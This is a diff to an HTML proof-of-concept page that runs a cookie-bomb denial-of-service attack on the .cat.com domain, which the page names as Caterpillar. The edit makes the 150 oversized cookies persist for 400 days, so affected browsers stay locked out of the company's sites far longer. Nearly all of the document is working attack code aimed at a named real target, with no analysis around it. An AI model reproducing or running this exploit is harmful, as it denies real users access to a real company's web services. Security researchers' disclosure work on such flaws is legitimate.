@@ -10,8 +10,10 @@
     <button onclick="cookieBomb()">Execute DoS PoC</button>
     <script>
         function cookieBomb() {
+            // Expires 400 days (maximum allowed by modern browsers)
+            var expires = new Date(Date.now() + 400 * 24 * 60 * 60 * 1000).toUTCString();
             for (var i = 0; i < 150; i++) {
-                document.cookie = "cb_" + i + "=" + "B".repeat(3000) + "; domain=.cat.com; path=/; SameSite=None; Secure";
+                document.cookie = "cb_" + i + "=" + "B".repeat(3000) + "; domain=.cat.com; path=/; expires=" + expires + "; SameSite=None; Secure";
             }
             alert("DoS attack executed successfully!\n\nAll Caterpillar web properties are now unreachable in this browser.");
         }
